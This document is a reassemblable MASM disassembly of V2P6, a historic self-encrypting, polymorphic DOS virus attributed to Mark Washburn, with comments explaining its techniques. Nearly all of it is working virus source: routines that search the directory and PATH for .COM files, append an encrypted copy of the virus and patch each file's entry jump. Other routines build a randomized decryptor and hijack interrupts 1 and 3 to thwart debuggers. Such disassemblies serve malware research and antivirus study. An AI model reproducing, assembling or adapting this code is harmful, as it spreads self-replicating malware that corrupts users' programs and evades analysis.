
         ;**********************************************
         ;                                             *
         ;                  V2P6.ASM                   *
         ;                      a                      *
         ;           recompilable disassembly          *
         ;                      of                     *
         ;             Mark Washburn's V2P6            *
         ;               self-encrypting,              *
         ;               variable-length               *
         ;                    virus                    *
         ;                      -                      *
         ;           WRITTEN FOR REASSEMBLY            *
         ;        WITH MICROSOFT MASM ASSEMBLER.       *
         ;                                             *
         ;                                             *
         ;   1) The V2P6 uses a "sliding-window"       *
         ;      encryption technique that relies on    *
         ;      Interrupts One and Three.  The         *
         ;      "INSERT_ENCRYPTION_TECHNIQUES" call    *
         ;      inserts the appropriate code for       *
         ;      this task.                             *
         ;                                             *
         ;   2) Occasionally, NOPS and Interrupt 3     *
         ;      calls are used as "false code" that    *
         ;      is designed to confuse those who       *
         ;      attempt to disassemble the virus.      *
         ;      THEY are not true INT 3 or NOP         *
         ;      instructions. These attempts are       *
         ;      clearly labeled as such.               *
         ;                                             *
         ;**********************************************

CODE_SEG SEGMENT
ASSUME CS:CODE_SEG, DS:CODE_SEG, ES:CODE_SEG, SS:CODE_SEG
ORG 0100H
V2P6 PROC NEAR

THE_BEGINNING:
  JMP SHORT DEGARBLER

  DB "  V2P6.ASM   "

DEGARBLER:
  CALL INSERT_ENCRYPTION_TECHNIQUES 
  DB 36 DUP (090H)                  
                                    
;========== Body encryption takes place from here down ===========

START:
   MOV BP,SP
   SUB SP,029H
   PUSH CX
   MOV DX,OFFSET VARIABLE_CODE
   MOV WORD PTR[BP-014H],DX
   CLI
   CLD

STORE_INTERRUPT_ADDRESSES:
   PUSH DS
   MOV AX,0
   PUSH AX
   POP DS
   CLI
   MOV AX,DS:WORD PTR[4]
   MOV WORD PTR[BP-028H],AX
   MOV AX,DS:WORD PTR[6]
   MOV WORD PTR[BP-026H],AX
   MOV AX,DS:WORD PTR[0CH]
   MOV WORD PTR[BP-024H],AX
   MOV AX,DS:WORD PTR[0EH]
   MOV WORD PTR[BP-022H],AX
   STI
   POP DS

REPLACE_INTERRUPT_ADDRESSES:
   CALL REPLACE_ONE_AND_THREE    
   MOV SI,DX                     
   ADD SI,0E4H                   
   MOV DI,0100H                  
   MOV CX,3                      
   CLD                           
   REP MOVSB

CHECK_DOS_VERSION:
   MOV SI,DX
   MOV AH,030H
   INT 021H
   CMP AL,0
   NOP                       ;Breakpoint Encryption.
   NOP
   JNE STORE_THE_DTA
   JMP EXIT

STORE_THE_DTA:
   PUSH ES
   MOV AH,02FH
   INT 021H
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV WORD PTR[BP-4],BX
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV WORD PTR[BP-2],ES
   POP ES

SET_NEW_DTA:
   MOV DX,SI
   ADD DX,0135H
   MOV AH,01AH
   INT 021H
   PUSH ES
   PUSH SI
   MOV ES,DS:WORD PTR[02CH]
   MOV DI,0H

FIND_ENVIRONMENT:
   POP SI
   PUSH SI
   ADD SI,0F0H
   LODSB
   MOV CX,08000H
   REPNE SCASB
   MOV CX,4H
 LOOOPER:
   LODSB
   SCASB
   JNE FIND_ENVIRONMENT
  LOOP LOOOPER
   POP SI
   POP ES
   MOV WORD PTR[BP-0CH],DI            
   MOV BX,SI
   ADD SI,0F5H
   MOV DI,SI
   JMP SHORT COPY_FILE_SPEC_TO_WORK_AREA 

   NOP
   INT 3                     ;False code. 
 
NO_FILE_FOUND: 
   CMP WORD PTR[BP-0CH],0
   JNE FOLLOW_THE_PATH
   JMP RESTORE_DTA 
 
   INT 3                     ;False code. 
 
FOLLOW_THE_PATH: 
   PUSH DS 
   PUSH SI
   MOV DS,ES:WORD PTR[02CH]
   MOV DI,SI
   MOV SI,ES:WORD PTR[BP-0CH]
   ADD DI,0F5H
 
UP_TO_LODSB:
   LODSB 
   CMP AL,03BH
   JE SEARCH_AGAIN
   CMP AL,0 
   JE CLEAR_SI 
   STOSB 
   JMP SHORT UP_TO_LODSB 

   INT 3                     ;False code. 
 
CLEAR_SI: 
   MOV SI,0
 
SEARCH_AGAIN: 
   POP BX
   POP DS 
   MOV WORD PTR[BP-0CH],SI 
   CMP CH,0FFH
   JE COPY_FILE_SPEC_TO_WORK_AREA
   MOV AL,05CH
   STOSB
 
COPY_FILE_SPEC_TO_WORK_AREA:
   MOV WORD PTR[BP-0EH],DI
   MOV SI,BX 
   ADD SI,0EAH                 
   MOV CX,6 
   REP MOVSB                  
   MOV SI,BX
   MOV AH,04EH 
   MOV DX,SI 
   ADD DX,0F5H 
   MOV CX,3
   INT 021H                    
   JMP SHORT CHECK_CARRY_FLAG 
 
   NOP                       ;False code. 
   INT 3 

FIND_NEXT_FILE:
   MOV AH,04FH 
   INT 021H
 
CHECK_CARRY_FLAG:
   JAE FILE_FOUND
   JMP SHORT NO_FILE_FOUND 
 
   INT 3                     ;False code. 
 
FILE_FOUND:
   MOV AX,WORD PTR[SI+014BH]          
   AND AL,01FH                 
   CMP AL,01FH
   JE FIND_NEXT_FILE
   CMP WORD PTR[SI+014FH],0F902H 
   JE FIND_NEXT_FILE 
   CMP WORD PTR[SI+014FH],0AH
   JE FIND_NEXT_FILE 
   MOV DI,WORD PTR[BP-0EH]            
   PUSH SI
   ADD SI,0153H
 
MOVE_ASCII_FILENAME: 
   LODSB 
   STOSB
   CMP AL,0
   JNE MOVE_ASCII_FILENAME    
   POP SI 
 
GET_FILE_ATTRIBUTE: 
   MOV AX,04300H
   MOV DX,SI 
   ADD DX,0F5H 
   INT 021H

STORE_FILE_ATTRIBUTE: 
   MOV WORD PTR[BP-0AH],CX            
 
CLEAR_FILE_ATTRIBUTE: 
   MOV AX,04301H
   AND CX,-2
   MOV DX,SI
   ADD DX,0F5H
   INT 021H
 
OPEN_FILE:
   MOV AX,03D02H
   MOV DX,SI 
   ADD DX,0F5H
   INT 021H
   JAE GET_DATE_AND_TIME 
   JMP SET_THE_ATTRIBUTE
 
   INT 3                     ;False code. 

GET_DATE_AND_TIME:
   MOV BX,AX                  
   MOV AX,05700H
   INT 021H
 
STORE_DATE_AND_TIME: 
   MOV WORD PTR[BP-8],CX
   MOV WORD PTR[BP-6],DX
 
READ_FIRST_THREE_BYTES: 
   MOV AH,03FH
   MOV CX,3
   MOV DX,SI
   ADD DX,0E4H
   INT 021H                    
   NOP                       ;Breakpoint Encryption. 
   NOP 
   JB ERROR_OCCURRED
   NOP                       ;Breakpoint Encryption. 
   NOP 
   CMP AX,3
   NOP                       ;Breakpoint Encryption.
   NOP 
   JNE ERROR_OCCURRED         
   NOP                       ;Breakpoint Encryption. 
   NOP 
 
GET_FILE_LENGTH:
   MOV AX,04202H
   NOP                       ;Breakpoint Encryption. 
   NOP 
   MOV CX,0
   MOV DX,0
   INT 021H
   JAE AT_END_OF_FILE         
 
ERROR_OCCURRED: 
   JMP SET_DATE_AND_CLOSE_FILE

AT_END_OF_FILE: 
   NOP                       ;Breakpoint Encryption. 
   NOP
   PUSH BX
   NOP                       ;Breakpoint Encryption. 
   NOP 
   MOV CX,AX                  
   PUSH CX                    
   NOP                       ;Breakpoint Encryption. 
   NOP
   SUB AX,3
   NOP                       ;Breakpoint Encryption. 
   NOP 
   MOV WORD PTR[SI+0E8H],AX           
   ADD CX,06CDH
   NOP                       ;Breakpoint Encryption.
   NOP    
   MOV DI,SI 
   NOP                       ;Breakpoint Encryption. 
   NOP 
   SUB DI,059FH
   NOP                       ;Breakpoint Encryption. 
   NOP                        
   MOV WORD PTR[DI],CX
   MOV AH,02CH
   INT 021H                    
   XOR DX,CX                  
   NOP                       ;Breakpoint Encryption. 
   NOP 
   MOV CX,WORD PTR[SI+0E2H]           
   NOP                       ;Breakpoint Encryption.
   NOP
   XOR CX,DX                  
   NOP                       ;Breakpoint Encryption. 
   NOP 
   MOV WORD PTR[SI+0E2H],DX
   NOP                       ;Breakpoint Encryption.
   NOP                        
   MOV WORD PTR[BP-01EH],DX           

CREATE_THE_DEGARBLER:
   CALL DEGARB_CALL_THREE
   MOV AL,BYTE PTR[BP-01EH]
   AND AL,3
   CMP AL,3
   JE CREATE_THE_DEGARBLER
   PUSH AX
   ROR AL,1
   NOP                       ;Breakpoint Encryption.
   NOP
   ROR AL,1
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BYTE PTR[SI+O10H],AL
   POP AX
   ADD AL,2
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BYTE PTR[SI+O3CH],AL

CREATE_DEGARBLER_PART_TWO:
   CALL DEGARB_CALL_THREE
   MOV AL,BYTE PTR[BP-01EH]
   AND AL,7
   CMP AL,6
   JA CREATE_DEGARBLER_PART_TWO
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BYTE PTR[BP-01BH],AL
   PUSH AX
   NOP                       ;Breakpoint Encryption.
   NOP
   XOR AH,AH
   SHL AX,1
   NOP                       ;Breakpoint Encryption.
   NOP
   INC AX
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BX,SI
   ADD BX,[O5CH]
   ADD BX,AX
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV DL,BYTE PTR[BX]
   POP AX
   NOP                       ;Breakpoint Encryption.
   NOP
   CMP AL,3
   JA CREATE_DEGARBLER_PART_FOUR

CREATE_DEGARBLER_PART_THREE:
   CALL DEGARB_CALL_THREE
   AND AL,DL
   JE CREATE_DEGARBLER_PART_THREE
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BYTE PTR[BP-01CH],AL
   NOP                       ;Breakpoint Encryption.
   NOP
   PUSH AX
   MOV BL,AL
   NOP                       ;Breakpoint Encryption.
   NOP
   NOT BL
   AND DL,BL
   NOP                       ;Breakpoint Encryption.
   NOP
   CALL DEGARB_CALL_TWO
   MOV AL,DL
   NOP                       ;Breakpoint Encryption.
   NOP
   XOR DH,DH
   SHL DX,1
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BX,SI
   ADD BX,[O24H]
   ADD BX,DX
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BX,WORD PTR[BX]
   MOV WORD PTR[SI+ODH],BX
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BL,080H
   MOV BYTE PTR[BP-010H],BL
   NOP                       ;Breakpoint Encryption.
   NOP
   POP DX
   CALL DEGARB_CALL_TWO
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV DH,DL
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV DL,AL
   JMP SHORT CREATE_DEGARBLER_PART_FIVE

CREATE_DEGARBLER_PART_FOUR:
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BYTE PTR[BP-01CH],DL
   NOP                       ;Breakpoint Encryption.
   NOP
   CALL DEGARB_CALL_TWO
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV DH,DL
   NOP                       ;Breakpoint Encryption.
   NOP
  REAL_NOPS:
   MOV BX,09090H
   MOV WORD PTR[SI+ODH],BX
   NOP                       ;Breakpoint Encryption.
   NOP
   XOR DL,DL
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV BYTE PTR[BP-010H],DL
   MOV DL,0FFH

CREATE_DEGARBLER_PART_FIVE:
   CALL DEGARB_CALL_THREE
   MOV AL,BYTE PTR[BP-01EH]
   AND AL,0FH
   CMP AL,0CH
   JA CREATE_DEGARBLER_PART_FIVE
   CMP AL,DH
   JE CREATE_DEGARBLER_PART_FIVE
   CMP AL,DL
   JE CREATE_DEGARBLER_PART_FIVE
   MOV BYTE PTR[BP-0FH],AL
   XOR AH,AH
   SHL AX,1
   SHL AX,1
   MOV BX,SI
   ADD BX,[O6AH]
   ADD BX,AX
   MOV CL,BYTE PTR[BX]
   MOV AL,031H
   TEST CL,8
   JNE OVER_ONE
   MOV AL,030H
 OVER_ONE:
   MOV BYTE PTR[SI+0DBH],AL
   MOV BYTE PTR[SI+OFH],AL
   MOV AL,5
   TEST CL,8
   JNE OVER_SEVERAL
   TEST CL,4
   JE OVER_SEVERAL
   MOV AL,025H
 OVER_SEVERAL:
   MOV BYTE PTR[SI+0DCH],AL
   MOV AL,BYTE PTR[SI+O10H]
   AND CL,7
   XOR CH,CH
   SHL CX,1
   SHL CX,1
   SHL CX,1
   OR AL,CL
   MOV CL,BYTE PTR[BP-01BH]
   SHL CX,1
   MOV BX,SI
   ADD BX,[O5CH]
   ADD BX,CX
   MOV CL,BYTE PTR[BX]
   OR AL,CL
   MOV BYTE PTR[SI+O10H],AL
   MOV BX,SI
   ADD BX,[O6AH]
   XOR CL,CL
   MOV BYTE PTR[BP-01BH],CL
   MOV AL,BYTE PTR[BP-0FH]
   CMP AL,9
   JA THREE_ADJUSTMENTS
   XOR AH,AH
   SHL AX,1
   SHL AX,1
   ADD BX,AX
   INC BX
   MOV AL,BYTE PTR[BX]
   MOV BYTE PTR[SI+O1BH],AL
   INC BX
   INC BX
   MOV AL,BYTE PTR[BX]
   MOV BYTE PTR[SI+O6],AL
   MOV BX,SI
   ADD BX,[O6AH]
   JMP SHORT NO_ADJUSTMENT

   INT 3                     ;False code.

THREE_ADJUSTMENTS:
   MOV CL,0FFH
   MOV BYTE PTR[BP-01BH],CL
   MOV CL,090H
   MOV BYTE PTR[SI+O1BH],CL
   MOV CL,0B8H
   MOV BYTE PTR[SI+O6],CL

NO_ADJUSTMENT:
   MOV DL,BYTE PTR[BP-01CH]
   CALL DEGARB_CALL_TWO
   XOR DH,DH
   SHL DX,1
   SHL DX,1
   ADD BX,DX
   INC BX
   INC BX
   MOV AL,BYTE PTR[BX]
   MOV BYTE PTR[SI+O1AH],AL
   INC BX
   MOV AL,BYTE PTR[BX]
   MOV BYTE PTR[SI+ZERO],AL
   NOP                       ;Breakpoint Encryption.
   NOP
   CALL DEGARB_CALL_THREE
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV AX,WORD PTR[BP-01EH]
   AND AX,0FFH
   ADD AX,0709H
   MOV WORD PTR[BP-018H],AX
   MOV WORD PTR[SI+O4],AX
   POP CX
   ADD CX,0127H
   MOV WORD PTR[SI+O1],CX
   MOV CL,BYTE PTR[BP-01BH]
   OR CL,CL
   JNE CREATE_DEGARBLER_PART_SIX
   NOP                       ;Breakpoint Encryption.
   NOP
   CALL DEGARB_CALL_THREE
   MOV AX,WORD PTR[BP-01EH]
   MOV WORD PTR[SI+O7],AX

CREATE_DEGARBLER_PART_SIX:
   MOV WORD PTR[BP-016H],AX
   MOV DI,SI
   SUB DI,05CDH
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV AX,3
   MOV CL,BYTE PTR[BP-010H]
   OR AL,CL
   MOV CL,BYTE PTR[BP-01BH]
   OR CL,CL
   JNE OVER_OR
   OR AX,4
 OVER_OR:
   MOV BX,SI
   ADD BX,[O2CH]
   MOV WORD PTR[BP-01AH],AX
   CALL DEGARB_CALL_FIVE
   MOV WORD PTR[BP-012H],DI
REAL_NOP:
   ADD BX,[OO10H]
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV AX,1
   CALL DEGARB_CALL_ONE
   MOV WORD PTR[BP-01AH],AX
   NOP                       ;Breakpoint Encryption.
   NOP
   CALL DEGARB_CALL_FIVE
   ADD BX,[OO10H]
   MOV AX,1
   MOV CL,BYTE PTR[BP-01BH]
   OR CL,CL
   JNE OVER_THE_OR
   OR AX,2
 OVER_THE_OR:
   CALL DEGARB_CALL_ONE
   MOV WORD PTR[BP-01AH],AX
   NOP                       ;Breakpoint Encryption.
   NOP
   CALL DEGARB_CALL_FIVE
   MOV CX,2
   MOV SI,WORD PTR[BP-014H]
   NOP                       ;Breakpoint Encryption.
   NOP
   ADD SI,[O22H]
   REP MOVSB
   MOV AX,WORD PTR[BP-012H]
   SUB AX,DI
   DEC DI
   STOSB

LAST_STEP:
   MOV CX,WORD PTR[BP-014H]
   SUB CX,05A6H
   CMP CX,DI
   JE COPY_ENC_AND_WRITE_TO_MEMORY
   MOV DX,0
   CALL DEGARB_CALL_FOUR
   JMP SHORT LAST_STEP

   INT 3                     ;False code.

COPY_ENC_AND_WRITE_TO_MEMORY:
   MOV SI,WORD PTR[BP-014H]
   PUSH SI
   MOV DI,SI
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV CX,044H
   ADD SI,09EH
   NOP                       ;Breakpoint Encryption. 
   NOP
   ADD DI,0262H
   MOV DX,DI
   REP MOVSB
   POP SI
   POP BX
   CALL GET_OFFSET
   ADD AX,6
   PUSH AX
   JMP DX

WRITE_NEW_JUMP: 
   NOP                       ;Breakpoint Encryption. 
   NOP 
   JB SET_DATE_AND_CLOSE_FILE
   MOV AX,04200H
   MOV CX,0
   MOV DX,0
   INT 021H
   JB SET_DATE_AND_CLOSE_FILE 
   MOV AH,040H
   MOV CX,3
   NOP                       ;Breakpoint Encryption.
   NOP
   MOV DX,SI
   ADD DX,0E7H
   INT 021H

SET_DATE_AND_CLOSE_FILE:
   MOV DX,WORD PTR[BP-6]
   MOV CX,WORD PTR[BP-8]
   AND CX,-020H
   OR CX,01FH
   MOV AX,05701H
   INT 021H
   MOV AH,03EH 
   INT 021H

SET_THE_ATTRIBUTE:
   MOV AX,04301H
   MOV CX,WORD PTR[BP-0AH] 
   MOV DX,SI
   ADD DX,0F5H
   INT 021H

RESTORE_DTA: 
   PUSH DS 
   MOV DX,WORD PTR[BP-4] 
   MOV DS,WORD PTR[BP-2]
   MOV AH,01AH
   INT 021H
   POP DS 

EXIT: 
   POP CX 
   MOV SP,BP
   MOV DI,0100H
   PUSH DI
   XOR AX,AX
   XOR BX,BX
   XOR CX,CX
   XOR DX,DX 
   XOR SI,SI
   XOR BP,BP
   XOR DI,DI
   JMP RESTORE_ONE_AND_THREE

     ;========= Calls used to create the Degarbler =========== 
 
DEGARB_CALL_ONE:
   PUSH AX 
   CALL DEGARB_CALL_THREE
   MOV CL,AL 
   MOV CH,BYTE PTR[BP-01EH]
   POP AX 
   CMP CH,080H 
   JA TO_RET
   XOR CH,CH
   OR AX,CX
TO_RET:
   RET

DEGARB_CALL_TWO: 
   PUSH AX
   MOV AL,0
   UP_TO_SHIFT:
   SHR DL,1
   JB RIGHT_HERE
   INC AL 
   JMP SHORT UP_TO_SHIFT 
  RIGHT_HERE:
   MOV DL,AL 
   POP AX
   RET 

   INT 3                     ;False code. 
 
DEGARB_CALL_THREE:
   MOV CX,WORD PTR[BP-01EH]           
   XOR CX,0813CH
   ADD CX,09249H
   ROR CX,1
   ROR CX,1
   ROR CX,1                   
   MOV WORD PTR[BP-01EH],CX
   AND CX,7
   PUSH CX
   INC CX
   XOR AX,AX
   STC 
   RCL AX,CL 
   POP CX
   RET 

GET_OFFSET: 
   POP AX
   PUSH AX 
   RET 

DEGARB_CALL_FOUR: 
   CALL DEGARB_CALL_THREE
   TEST DX,AX
   JNE DEGARB_CALL_FOUR
   OR DX,AX
   MOV AX,CX 
   SHL AX,1
   PUSH AX
   XLATB
   MOV CX,AX
   POP AX
   INC AX 
   XLATB 
   ADD AX,WORD PTR[BP-014H]
   MOV SI,AX 
   REP MOVSB
   RET 

DEGARB_CALL_FIVE: 
   MOV DX,0 
   PRETTY_PLACE:
   CALL DEGARB_CALL_FOUR 
   MOV AX,DX
   AND AX,WORD PTR[BP-01AH]
   CMP AX,WORD PTR[BP-01AH]
   JNE PRETTY_PLACE
   RET

   ;====== Encryption and debugger stopping routines =======

NEW_INT_THREE:
   PUSH BX
   MOV BX,SP
   PUSH AX
   PUSH SI
   PUSH DS
   PUSH CS
   POP DS
   OR BYTE PTR[BX+7],1
   MOV SI,WORD PTR[BX+2]
   INC WORD PTR[BX+2]
   MOV WORD PTR[BP-020H],SI
   LODSB
   XOR BYTE PTR[SI],AL
   IN AL,021H
   MOV BYTE PTR[BP-029H],AL
   MOV AL,0FFH
   OUT 021H,AL
   POP DS
   POP SI
   POP AX
   POP BX
   IRET

NEW_INT_ONE:
   PUSH BX
   MOV BX,SP 
   PUSH AX
   AND SS:BYTE PTR[BX+7],0FEH
   MOV BX,WORD PTR[BP-020H]
   MOV AL,CS:BYTE PTR[BX]
   XOR CS:BYTE PTR[BX+1],AL
   MOV AL,BYTE PTR[BP-029H]
   OUT 021H,AL 
   MOV AL,020H
   OUT 020H,AL
   POP AX
   POP BX
   IRET

REPLACE_ONE_AND_THREE:
   PUSHF
   PUSH DS
   PUSH AX
   MOV AX,0
   PUSH AX
   POP DS
   MOV AX,WORD PTR[BP-014H]
   SUB AX,093H
   CLI
   MOV DS:WORD PTR[000CH],AX
   MOV AX,WORD PTR[BP-014H]
   SUB AX,06DH
   MOV DS:WORD PTR[0004],AX
   PUSH CS
   POP AX
   MOV DS:WORD PTR[0006],AX
   MOV DS:WORD PTR[000EH],AX
   STI
   POP AX
   POP DS
   POPF
   RET

RESTORE_ONE_AND_THREE:
   PUSHF
   PUSH DS
   PUSH AX
   MOV AX,0
   PUSH AX
   POP DS
   MOV AX,WORD PTR[BP-024H]
   CLI
   MOV DS:WORD PTR[000CH],AX
   MOV AX,WORD PTR[BP-028H]
   MOV DS:WORD PTR[0004],AX
   MOV AX,WORD PTR[BP-026H]
   MOV DS:WORD PTR[0006],AX
   MOV AX,WORD PTR[BP-022H]
   MOV DS:WORD PTR[000EH],AX
   STI
   POP AX
   POP DS
   POPF
   RET

        ;============= The Variable Code =============== 
 
VARIABLE_CODE: 
   MOV SI,0 
   MOV CX,0
   MOV DX,0 
   NOP
   CLC
   STC 
   CLD
   XOR BP,BP 

XORING_HERE:
   XOR WORD PTR[BP+SI],DX
   ADD BYTE PTR[BX+SI],AL
   STC
   CMC
   CLC
   CLD
   STI
   NOP
   CLC 
   INC SI 
   DEC DX 
   CLD 
   CMC
   STI 
   CLC
   STC
   NOP 
  LOOP XORING_HERE
   XOR BP,BP 
   XOR BX,BX
   XOR DI,DI
   XOR SI,SI
   ADD AX,WORD PTR[BX+SI]
   ADD AX,WORD PTR[BP+DI]
   ADD AX,DS:WORD PTR[0901H]
   ADD WORD PTR[BP+SI],CX
   ADD WORD PTR[BP+DI],CX
   ADD WORD PTR[SI],CX
   ADD CL,BYTE PTR[DI]
   ADD CL,BYTE PTR[BX]
   ADD WORD PTR[BP+DI],DX
   ADD WORD PTR[SI],DX
   ADD WORD PTR[DI],DX
   ADD DS:WORD PTR[01701H],DX
   ADD WORD PTR[BX+SI],BX
   ADD WORD PTR[BX+DI],BX
   ADD WORD PTR[BP+SI],BX
   ADD WORD PTR[BP+DI],BX
   ADD WORD PTR[SI],BX
   ADD WORD PTR[DI],BX
   ADD DS:WORD PTR[01F01H],BX
   ADD WORD PTR[BX+SI],SP
   ADD WORD PTR[BX+DI],SP
   ADD BYTE PTR[BP+SI],CL
   ADD DS:WORD PTR[0902H],AX
   ADD AX,WORD PTR[DI]
   ADD AL,8
   ADD AX,0704H
   ADD CL,BYTE PTR[DI]
   DEC BP
   INC BP
   MOV BP,04B0BH
   INC BX
   MOV BX,04F0FH
   INC DI
   MOV DI,04E0EH
   INC SI
   MOV SI,04808H
   INC AX
   MOV AX,04800H
   INC AX
   MOV AX,04804H
   INC AX
   MOV AX,04A0AH
   INC DX
   MOV DX,04A02H
   INC DX
   MOV DX,04A06H
   INC DX
   MOV DX,9
   ADD BYTE PTR[BX+SI],AL
   ADD WORD PTR[BX+SI],AX
   ADD BYTE PTR[BX+SI],AL
   ADD AX,0
   DB 0

   ;======= Only the Memory Image of the following code =====
   ;=======             is ever executed                =====

ENCRYPT_WRITE_AND_DECRYPT:
   MOV CX,WORD PTR[BP-018H]
   MOV AX,WORD PTR[BP-016H]
   MOV DI,SI
   SUB DI,05A6H
   CALL ENCRYPT_BODY
   MOV AH,040H
   MOV DX,WORD PTR[BP-01EH]
   AND DX,0FFH
   MOV CX,WORD PTR[BP-018H]
   ADD CX,[O27H]
   ADD CX,DX
   MOV DX,SI
   SUB DX,05CDH
   INT 021H
   PUSHF
   PUSH AX
   MOV CX,WORD PTR[BP-018H]
   MOV AX,WORD PTR[BP-016H]
   MOV DI,SI
   SUB DI,05A6H
   CALL ENCRYPT_BODY
   POP AX
   POPF
   RET

ENCRYPT_BODY:
   XOR WORD PTR[DI],AX
   DEC AX
   INC DI
  LOOP ENCRYPT_BODY
   RET

   ;================= Data Section begins here ===============
 
RANDOM_KEY: 
DB 006H, 02CH 
 
STORAGE_OF_INITIAL_JUMP:
DB 0E9H, 0FDH, 0FEH 

NEW_JUMP_INSTRUCTION:
DB 0E9H, 00, 00 

FILE_SPEC: 
DB "*.COM", 00

OFFSET_OF_PATH:
DB "PATH="

WORK_AREA:
DB 64 DUP (0)

NEW_DTA:
DB 30 DUP (0) 
 
TARGET_FILE_NAME:
DB 13 DUP (0)

;============ THE FOLLOWING IS NOT PART OF THE VIRUS =============
;  Needed to insert initial random encryption values, etc.  for the
;  first time. Values used here may correspond to Washburn's original 
;  values.  They were obtained from a sample of V2P6 which might have
;  been an original compilation of the virus by its author.

INSERT_ENCRYPTION_TECHNIQUES:
   XOR BP,BP
   MOV BX,OFFSET TRANS_TABLE
   MOV SI,OFFSET START
   MOV DI,OFFSET REAL_NOPS
   MOV DX,OFFSET REAL_NOP
   INC DI
   ADD DX,3

  SEARCH_FOR_NOPS:
   INC SI
   CMP SI,OFFSET EXIT
   JE ANOTHER_RET
   CMP SI,DI
   JE LEAVE_IN
   CMP SI,DX
   JE LEAVE_IN
   CMP WORD PTR[SI],09090H
   JNE SEARCH_FOR_NOPS
   CALL INSERT_BREAKPOINT_AND_XORING_VALUE
  LEAVE_IN:
   JMP SHORT SEARCH_FOR_NOPS

INSERT_BREAKPOINT_AND_XORING_VALUE:
   MOV BYTE PTR[SI],0CCH
   MOV AX,BP
   XLATB
   MOV BYTE PTR[SI+1],AL
   XOR BYTE PTR[SI+2],AL
   INC BP
  ANOTHER_RET:
   RET

TRANS_TABLE:
   DB 08BH, 060H, 0D4H, 0C6H, 048H, 057H, 016H, 06EH
   DB 0D3H, 087H, 080H, 000H, 090H, 07EH, 051H, 056H
   DB 056H, 0F6H, 062H, 074H, 072H, 072H, 032H, 00AH
   DB 0AFH, 03BH, 0AAH, 0BBH, 0FAH, 041H, 038H, 009H
   DB 02FH, 0ABH, 0DCH, 0E5H, 004H, 010H, 08EH, 01FH
   DB 00DH, 04FH, 0F7H, 002H, 0F0H, 002H, 050H, 036H
   DB 04AH, 037H, 04AH, 077H, 0B2H, 07AH, 0B1H, 07AH
   DB 031H

 O10H  EQU  010H
 O3CH  EQU  03CH
 ODH   EQU  0DH
 OFH   EQU  0FH
 O1BH  EQU  01BH
 O6    EQU  06
 O1AH  EQU  01AH
 O4    EQU  04
 O7    EQU  07
 O5CH  EQU  05CH
 O24H  EQU  024H
 O6AH  EQU  06AH
 O1    EQU  01
 O2CH  EQU  02CH
 OO10H EQU  0010H
 O22H  EQU  022H
 O27H  EQU  027H
 ZERO  EQU  0


V2P6 ENDP
CODE_SEG ENDS
END V2P6
